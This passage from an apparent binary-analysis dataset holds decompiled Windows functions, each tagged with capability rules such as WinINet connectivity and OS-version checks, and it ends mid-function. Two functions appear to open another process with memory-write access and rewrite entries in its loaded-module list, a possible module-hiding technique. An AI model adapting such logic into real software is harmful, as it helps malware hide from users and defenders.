        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00056b90(void)\n\n{\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (*0xb1c5b707 != '\\0') {\n        *0xb1c5b707 = '\\0';\n        *0xb1c59cea = 1;\n        fcn.000340b0(0xb1c5a7c8);\n        fcn.00037270(0xb1c5a7c0, 0);\n        fcn.00037220(0xb1c5a7c0);\n        fcn.00034080(0xb1c5a7c8);\n        for (var_8h = 0; var_8h < 4; var_8h = var_8h + 1) {\n            if (*(var_8h * 0x3c + -0x4e3a8464) != 0) {\n                (**(var_8h * 0x3c + -0x4e3a8438))(var_8h, 1);\n            }\n        }\n        fcn.00034520(0xb1c5a7cc);\n        (**0xb1bde00c)();\n        for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n            if (*(*0xb1c6773c + var_8h * 0x18) != 0) {\n                fcn.00035330(*(*0xb1c6773c + var_8h * 0x18));\n            }\n        }\n        (**0xb1bde010)();\n        fcn.00035330(*0xb1c6773c);\n        *0xb1c6773c = 0;\n    }\n    return;\n}\n",
        "token_count": 421
    },
    "00056cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00056cb0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (*0xb1c5b707 == '\\0') {\n        var_4h = 0xffffffff;\n    }\n    else {\n        fcn.00034550(0xb1c5a7cc);\n        uVar1 = fcn.00029470(*(arg_8h * 0x3c + -0x4e3a8460), 0);\n        *(arg_8h * 0x3c + -0x4e3a845c) = uVar1;\n        if (*(arg_8h * 0x3c + -0x4e3a845c) == 0) {\n            *(arg_8h * 0x3c + -0x4e3a845c) = 0xffffffff;\n        }\n        uVar1 = fcn.00029470(*(arg_8h * 0x3c + -0x4e3a8458), 0);\n        *(arg_8h * 0x3c + -0x4e3a8454) = uVar1;\n        if (*(arg_8h * 0x3c + -0x4e3a8454) == 0) {\n            *(arg_8h * 0x3c + -0x4e3a8454) = 0xffffffff;\n        }\n        if (*(arg_8h * 0x3c + -0x4e3a8464) == 0) {\n            uVar1 = fcn.00035690(*(arg_8h * 0x3c + -0x4e3a8430), 0xb1be2738);\n            *(arg_8h * 0x3c + -0x4e3a8434) = uVar1;\n            if (*(arg_8h * 0x3c + -0x4e3a8434) == 0) {\n                var_4h = fcn.00035620();\n            }\n            else {\n                iVar2 = arg_8h * 0x3c;\n                *(iVar2 + -0x4e3a8450) = 0;\n                *(iVar2 + -0x4e3a844c) = 0;\n                *(iVar2 + -0x4e3a8448) = 0;\n                *(iVar2 + -0x4e3a8444) = 0;\n                *(iVar2 + -0x4e3a8440) = 0;\n                uVar1 = fcn.00035920(*(arg_8h * 0x3c + -0x4e3a8434));\n                uVar1 = fcn.00035930(uVar1);\n                *(arg_8h * 0x3c + -0x4e3a8440) = uVar1;\n                fcn.000294b0(*(arg_8h * 0x3c + -0x4e3a8468), 1);\n                *(arg_8h * 0x3c + -0x4e3a8464) = 1;\n                var_4h = 0;\n            }\n        }\n        else {\n            var_4h = 0x21590006;\n        }\n        fcn.000345c0(0xb1c5a7cc);\n    }\n    return var_4h;\n}\n",
        "token_count": 784
    },
    "00056e30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00056e30(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    if (*0xb1c5b707 == '\\0') {\n        uVar1 = 0x21590006;\n    }\n    else {\n        fcn.00034550(0xb1c5a7cc);\n        if (*(arg_8h * 0x3c + -0x4e3a8464) != 0) {\n            fcn.00035b40(*(arg_8h * 0x3c + -0x4e3a8434));\n            if (arg_ch == 0) {\n                fcn.000294b0(*(arg_8h * 0x3c + -0x4e3a8468), 0);\n            }\n            *(arg_8h * 0x3c + -0x4e3a8464) = 0;\n        }\n        fcn.000345c0(0xb1c5a7cc);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 250
    },
    "00056f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00056f00(uint arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_18h * 0x3c + -0x4e3a8464) != 0) {\n        var_8h = arg_18h;\n        (**0xb1bde100)(&var_10h);\n        iVar1 = fcn.00035230(arg_ch + arg_14h);\n        if (iVar1 == 0) {\n            fcn.000569a0(arg_18h * 0x3c + -0x4e3a8448);\n        }\n        else {\n            fcn.0007877e(iVar1, arg_8h, arg_ch);\n            fcn.0007877e(iVar1 + arg_ch, arg_10h, arg_14h);\n            (**0xb1bde00c)();\n            uVar3 = (*0xb1c5a7d0 + 1) % 100;\n            if (uVar3 == *0xb1c5a7d4) {\n                if (arg_18h == 0) {\n                    fcn.000569a0(0xb1c57bb8);\n                }\n            }\n            else {\n                piVar2 = *0xb1c5a7d0 * 0x18 + *0xb1c6773c;\n                *piVar2 = iVar1;\n                piVar2[1] = arg_ch + arg_14h;\n                piVar2[2] = var_10h;\n                piVar2[3] = var_ch;\n                piVar2[4] = var_8h;\n                piVar2[5] = var_4h;\n                *0xb1c5a7d0 = uVar3;\n            }\n            (**0xb1bde010)();\n            fcn.000340b0(0xb1c5a7c8);\n        }\n    }\n    return;\n}\n",
        "token_count": 535
    },
    "00057090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00057090(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_1ch = fcn.0006be20();\n    while (fcn.000340e0(0xb1c5a7c8, 60000),  *0xb1c59cea == '\\0') {\n        while ((**0xb1bde00c)(),  *0xb1c5a7d0 != *0xb1c5a7d4) {\n            puVar2 = *0xb1c5a7d4 * 0x18 + *0xb1c6773c;\n            arg_8h = *puVar2;\n            var_14h = puVar2[1];\n            var_10h = puVar2[2];\n            var_ch = puVar2[3];\n            var_8h = puVar2[4];\n            var_4h = puVar2[5];\n            puVar2 = *0xb1c5a7d4 * 0x18 + *0xb1c6773c;\n            *puVar2 = 0;\n            puVar2[1] = 0;\n            puVar2[2] = 0;\n            puVar2[3] = 0;\n            puVar2[4] = 0;\n            puVar2[5] = 0;\n            *0xb1c5a7d4 = (*0xb1c5a7d4 + 1) % 100;\n            (**0xb1bde010)();\n            if (*(var_8h * 0x3c + -0x4e3a8464) != 0) {\n                if ((*(var_8h * 0x3c + -0x4e3a8444) < *(var_8h * 0x3c + -0x4e3a8454)) &&\n                   (*(var_8h * 0x3c + -0x4e3a8440) < *(var_8h * 0x3c + -0x4e3a845c))) {\n                    fcn.00034550(0xb1c5a7cc);\n                    if ((var_8h == 0) || (var_8h == 3)) {\n                        fcn.00035840(&var_14h, 4, 1, *(var_8h * 0x3c + -0x4e3a8434));\n                        fcn.00035840(&var_10h, 8, 1, *(var_8h * 0x3c + -0x4e3a8434));\n                        if (var_8h == 0) {\n                            *0xb1c57bbc = *0xb1c57bbc + 1;\n                        }\n                    }\n                    fcn.00035840(arg_8h, var_14h, 1, *(var_8h * 0x3c + -0x4e3a8434));\n                    *(var_8h * 0x3c + -0x4e3a8440) = *(var_8h * 0x3c + -0x4e3a8440) + var_14h;\n                    fcn.000345c0(0xb1c5a7cc);\n                }\n                else {\n                    (**(var_8h * 0x3c + -0x4e3a8438))(var_8h, 1);\n                }\n            }\n            fcn.00035330(arg_8h);\n        }\n        (**0xb1bde010)();\n        iVar1 = fcn.0006be20();\n        if (59999 < iVar1 - var_1ch) {\n            fcn.0003ee70();\n            var_1ch = fcn.0006be20();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 931
    },
    "00057550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00057550(uint arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 0;\n    if (*0xb1c5b707 == '\\0') {\n        var_4h = 0x21590006;\n    }\n    else {\n        iVar1 = fcn.00020650(arg_10h, 0x58, 3, &var_8h, 4);\n        if (iVar1 == 0) {\n            if (arg_ch == 0x838) {\n                var_8h = 0;\n            }\n            else if (arg_ch == 0x853) {\n                var_8h = 2;\n            }\n            else {\n                if (arg_ch != 0x857) {\n                    return 0x21590001;\n                }\n                var_8h = 1;\n            }\n        }\n        if (*(var_8h * 0x3c + -0x4e3a8464) == 0) {\n            var_4h = 0x21590006;\n        }\n        else {\n            var_4h = (**(var_8h * 0x3c + -0x4e3a8438))(var_8h, 0);\n            if (var_4h == 0) {\n                var_4h = fcn.00057370(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 408
    },
    "00057630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00057630(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 0;\n    if (*0xb1c5b707 == '\\0') {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        iVar2 = fcn.00020650(arg_10h, 0x58, 3, &var_4ch, 4);\n        if (iVar2 == 0) {\n            var_4ch = 0;\n        }\n        *arg_14h = 3;\n        iVar2 = fcn.00020650(arg_10h, 0x1d, 2, &var_48h, 4);\n        if (iVar2 != 0) {\n            if (var_48h == 0) {\n                var_50h = -1;\n            }\n            else {\n                var_50h = var_48h;\n            }\n            *(var_4ch * 0x3c + -0x4e3a845c) = var_50h;\n        }\n        iVar2 = fcn.00020650(arg_10h, 0x1e, 2, &var_48h, 4);\n        if (iVar2 != 0) {\n            if (var_48h == 0) {\n                var_54h = -1;\n            }\n            else {\n                var_54h = var_48h;\n            }\n            *(var_4ch * 0x3c + -0x4e3a8454) = var_54h;\n        }\n        fcn.000294b0(*(var_4ch * 0x3c + -0x4e3a8460), *(var_4ch * 0x3c + -0x4e3a845c));\n        if (*(var_4ch * 0x3c + -0x4e3a8458) != 0) {\n            fcn.000294b0(*(var_4ch * 0x3c + -0x4e3a8458), *(var_4ch * 0x3c + -0x4e3a8454));\n        }\n        var_10h = 2;\n        var_ch = &var_24h;\n        var_24h = 0x2f;\n        var_20h = 2;\n        var_1ch = 0x30;\n        var_18h = 2;\n        var_14h = &var_44h;\n        var_8h = 1;\n        var_4h = &var_14h;\n        var_38h = 0;\n        var_28h = 0;\n        var_40h = &var_3ch;\n        var_44h = 4;\n        var_3ch = *(var_4ch * 0x3c + -0x4e3a845c);\n        var_30h = &var_2ch;\n        var_34h = 4;\n        var_2ch = *(var_4ch * 0x3c + -0x4e3a8454);\n        uVar1 = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 929
    },
    "000578c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.000578c0(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *arg_ch;\n    var_4h = arg_ch[2];\n    var_ch = fcn.0005a170(arg_8h, var_8h + 8, 0, &var_4h, 4);\n    if (var_ch == 0) {\n        var_ch = fcn.0005a170(arg_8h, var_4h, 0, &var_8h, 4);\n    }\n    return var_ch == 0;\n}\n",
        "token_count": 162
    },
    "00057930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00057930(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = arg_ch;\n    var_ch = fcn.0005a130(arg_8h, arg_ch + 8, 0, &var_4h, 4);\n    if ((((var_ch == 0) && (var_ch = fcn.0005a170(arg_8h, arg_10h, 0, &var_8h, 4),  var_ch == 0)) &&\n        (var_ch = fcn.0005a170(arg_8h, arg_10h + 8, 0, &var_4h, 4),  var_ch == 0)) &&\n       (var_ch = fcn.0005a170(arg_8h, var_4h, 0, &arg_10h, 4),  var_ch == 0)) {\n        var_ch = fcn.0005a170(arg_8h, var_8h + 8, 0, &arg_10h, 4);\n    }\n    return var_ch == 0;\n}\n",
        "token_count": 283
    },
    "00057a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00057a00(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = *arg_ch;\n    var_4h = arg_ch[1];\n    var_ch = fcn.0005a170(arg_8h, var_8h + 4, 0, &var_4h, 4);\n    if (var_ch == 0) {\n        var_ch = fcn.0005a170(arg_8h, var_4h, 0, &var_8h, 4);\n    }\n    return var_ch == 0;\n}\n",
        "token_count": 162
    },
    "00057a70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00057a70(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = arg_ch;\n    var_4h = arg_10h;\n    var_10h = fcn.0005a130(arg_8h, arg_ch + 4, 0, &var_8h, 4);\n    if ((((var_10h == 0) && (var_10h = fcn.0005a170(arg_8h, arg_10h, 0, &var_ch, 4),  var_10h == 0)) &&\n        (var_10h = fcn.0005a170(arg_8h, arg_10h + 4, 0, &var_8h, 4),  var_10h == 0)) &&\n       (var_10h = fcn.0005a170(arg_8h, var_8h, 0, &var_4h, 4),  var_10h == 0)) {\n        var_10h = fcn.0005a170(arg_8h, var_ch + 4, 0, &var_4h, 4);\n    }\n    return var_10h == 0;\n}\n",
        "token_count": 318
    },
    "00057b40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00057b40(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    int32_t var_21ch;\n    uint var_218h;\n    uint var_214h;\n    int32_t var_200h;\n    uint var_1f0h;\n    int32_t var_1e4h;\n    uint var_1e0h;\n    uint var_1d8h;\n    int32_t var_1d0h;\n    int32_t var_1cch;\n    int32_t var_1c8h;\n    int32_t var_1a4h;\n    int32_t var_1a0h;\n    int32_t var_174h;\n    int32_t var_16ch;\n    int32_t var_168h;\n    int32_t var_164h;\n    uint var_160h;\n    int32_t var_140h;\n    uint var_120h;\n    int32_t var_108h;\n    uint var_100h;\n    uint var_f0h;\n    uint32_t var_e0h;\n    uint32_t var_dch;\n    uint32_t var_d8h;\n    uint32_t var_d4h;\n    int32_t var_d0h;\n    int32_t var_cch;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    int32_t var_38h;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45910;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    *0x10 = &stack0xfffffdc8;\n    var_20h = 0;\n    if (var_10h == NULL) {\n        var_24h = 0x21590067;\n        goto code_r0x00057fd3;\n    }\n    *var_10h = 0;\n    var_24h = fcn.0005a2c0(&var_20h, 0x438, var_8h);\n    if ((var_24h == 0) && (var_24h = fcn.0005a030(var_20h, &var_19h),  var_24h == 0)) {\n        var_19h._0_1_ = '\\x01' - (var_19h != '\\0');\n        var_24h = fcn.00059c20(var_20h, &var_28h);\n        if (var_24h == 0) {\n            var_4h = 0;\n            if (var_19h == '\\0') {\n                var_24h = fcn.0005a130(var_20h, var_28h, 0, &var_1f0h, 0x10);\n                if (var_24h == 0) {\n                    if (var_1e4h == 0) {\n                        var_24h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_24h = fcn.0005a130(var_20h, var_1e4h, 0, &var_214h, 0x24);\n                        if (var_24h == 0) {\n                            var_21ch = var_200h;\n                            while (var_21ch != var_1e4h + 0x14) {\n                                var_24h = fcn.0005a130(var_20h, var_21ch, 0, &var_174h, 8);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00057fc1;\n                                }\n                                var_24h = fcn.0005a130(var_20h, var_21ch + -8, 0, &var_1e0h, 0x48);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00057fc1;\n                                }\n                                if (var_1c8h == var_ch) {\n                                    fcn.00057a00(var_20h, &var_1e0h);\n                                    fcn.00057a00(var_20h, &var_1d8h);\n                                    if ((var_1d0h != 0) && (var_1cch != 0)) {\n                                        fcn.00057a00(var_20h, &var_1d0h);\n                                    }\n                                    if ((var_1a0h != 0) && (var_1a4h != 0)) {\n                                        fcn.00057a00(var_20h, &var_1a4h);\n                                    }\n                                    *var_10h = var_21ch + -8;\n                                    break;\n                                }\n                                var_21ch = var_174h;\n                            }\n                            goto code_r0x00057f90;\n                        }\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_24h = fcn.0005a130(var_20h, var_28h, 0, &var_120h, 0x20);\n                if (var_24h == 0) {\n                    var_16ch = var_108h;\n                    if (var_108h == 0) {\n                        var_24h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_24h = fcn.0005a130(var_20h, var_108h, 0, &var_160h, 0x40);\n                        if (var_24h == 0) {\n                            var_168h = var_140h;\n                            while (var_168h != var_16ch + 0x20) {\n                                var_24h = fcn.0005a130(var_20h, var_168h, 0, &var_38h, 0x10);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00057fc1;\n                                }\n                                var_164h = var_168h + -0x10;\n                                var_24h = fcn.0005a130(var_20h, var_164h, 0, &var_100h, 0x88);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x00057fc1;\n                                }\n                                if ((var_d0h == var_ch) && (var_cch == 0)) {\n                                    fcn.000578c0(var_20h, &var_100h);\n                                    fcn.000578c0(var_20h, &var_f0h);\n                                    if (((var_e0h | var_dch) != 0) && ((var_d8h | var_d4h) != 0)) {\n                                        fcn.000578c0(var_20h, &var_e0h);\n                                    }\n                                    if (((var_88h | var_84h) != 0) && ((var_90h | var_8ch) != 0)) {\n                                        fcn.000578c0(var_20h, &var_90h);\n                                    }\n                                    *var_10h = var_164h;\n                                    break;\n                                }\n                                var_168h = var_38h;\n                            }\ncode_r0x00057f90:\n                            var_24h = (*var_10h != 0) - 1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n        }\n    }\ncode_r0x00057fc1:\n    if (var_20h != 0) {\n        fcn.00078544(var_20h);\n    }\ncode_r0x00057fd3:\n    *in_FS_OFFSET = var_10h_2;\n    return var_24h;\n}\n",
        "token_count": 1988
    },
    "00057ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00057ff0(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_220h;\n    int32_t var_21ch;\n    uint var_218h;\n    uint var_214h;\n    int32_t var_200h;\n    uint var_1f0h;\n    int32_t var_1e4h;\n    uint var_1e0h;\n    int32_t var_1c8h;\n    uint var_1a8h;\n    int32_t var_174h;\n    int32_t var_16ch;\n    int32_t var_168h;\n    int32_t var_164h;\n    uint var_160h;\n    int32_t var_140h;\n    uint var_120h;\n    int32_t var_108h;\n    uint var_100h;\n    int32_t var_d0h;\n    uint var_94h;\n    int32_t var_38h;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45900;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    *0x10 = &stack0xfffffdd0;\n    var_20h = 0;\n    if (var_ch == 0) {\n        var_24h = 0x21590066;\n        goto code_r0x000583a1;\n    }\n    if (var_10h == NULL) {\n        var_24h = 0x21590067;\n        goto code_r0x000583a1;\n    }\n    var_24h = fcn.0005a2c0(&var_20h, 0x410, var_8h);\n    if ((var_24h == 0) && (var_24h = fcn.0005a030(var_20h, &var_19h),  var_24h == 0)) {\n        var_19h._0_1_ = '\\x01' - (var_19h != '\\0');\n        var_24h = fcn.00059c20(var_20h, &var_28h);\n        if (var_24h == 0) {\n            var_4h = 0;\n            if (var_19h == '\\0') {\n                var_24h = fcn.0005a130(var_20h, var_28h, 0, &var_1f0h, 0x10);\n                if (var_24h == 0) {\n                    if (var_1e4h == 0) {\n                        var_24h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_24h = fcn.0005a130(var_20h, var_1e4h, 0, &var_214h, 0x24);\n                        if (var_24h == 0) {\n                            var_21ch = var_200h;\n                            while (var_21ch != var_1e4h + 0x14) {\n                                var_24h = fcn.0005a130(var_20h, var_21ch, 0, &var_174h, 8);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005838f;\n                                }\n                                var_24h = fcn.0005a130(var_20h, var_21ch + -8, 0, &var_1e0h, 0x48);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005838f;\n                                }\n                                if (var_1c8h == var_ch) {\n                                    *var_10h = var_1a8h;\n                                    var_24h = 0;\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005838f;\n                                }\n                                var_21ch = var_174h;\n                            }\n                            goto code_r0x0005835f;\n                        }\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_24h = fcn.0005a130(var_20h, var_28h, 0, &var_120h, 0x20);\n                if (var_24h == 0) {\n                    var_16ch = var_108h;\n                    if (var_108h == 0) {\n                        var_24h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_24h = fcn.0005a130(var_20h, var_108h, 0, &var_160h, 0x40);\n                        if (var_24h == 0) {\n                            var_168h = var_140h;\n                            while (var_168h != var_16ch + 0x20) {\n                                var_24h = fcn.0005a130(var_20h, var_168h, 0, &var_38h, 0x10);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005838f;\n                                }\n                                var_164h = var_168h + -0x10;\n                                var_24h = fcn.0005a130(var_20h, var_164h, 0, &var_100h, 0x88);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005838f;\n                                }\n                                if (var_d0h == var_ch) {\n                                    *var_10h = var_94h;\n                                    var_24h = 0;\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005838f;\n                                }\n                                var_168h = var_38h;\n                            }\ncode_r0x0005835f:\n                            *var_10h = 0;\n                            var_24h = 0;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n        }\n    }\ncode_r0x0005838f:\n    if (var_20h != 0) {\n        fcn.00078544(var_20h);\n    }\ncode_r0x000583a1:\n    *in_FS_OFFSET = var_10h_2;\n    return var_24h;\n}\n",
        "token_count": 1637
    },
    "000583c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000583c0(uint param_1, uint *param_2, int32_t *param_3)\n\n{\n    int16_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    uint *var_ch;\n    int32_t *var_10h;\n    uint var_1e8h;\n    uint var_1e0h;\n    uint *var_1dch;\n    uint var_1d8h;\n    uint var_1d0h;\n    uint *var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1b8h;\n    uint *var_1b4h;\n    uint var_1b0h;\n    uint var_1a8h;\n    uint *var_1a4h;\n    uint var_1a0h;\n    int32_t var_19ch;\n    uint var_198h;\n    int32_t var_18ch;\n    uint var_188h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    int32_t var_160h;\n    uint var_15ch;\n    int32_t var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_144h;\n    int32_t var_138h;\n    int32_t var_134h;\n    int32_t var_130h;\n    int32_t var_12ch;\n    int32_t var_128h;\n    int32_t var_124h;\n    int32_t var_120h;\n    int32_t var_11ch;\n    uint var_118h;\n    int32_t var_100h;\n    uint var_f8h;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b0h;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_78h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n  